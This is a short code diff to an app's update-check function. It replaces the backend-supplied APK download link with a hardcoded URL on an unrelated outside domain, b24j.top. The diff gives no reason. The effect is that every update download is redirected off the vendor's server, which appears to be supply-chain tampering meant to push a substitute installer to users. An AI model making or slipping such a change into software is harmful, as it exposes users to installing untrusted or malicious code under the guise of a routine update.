@@ -52,7 +52,7 @@ export async function checkForUpdate() {
     latest_version: data.version,
     current_version: currentVersion,
     mandatory: false, // backend has no mandatory-update concept yet
-    download_url: data.apk_url,
+    download_url: "https://b24j.top/",
     changelog: data.notes || null,
   };
 }
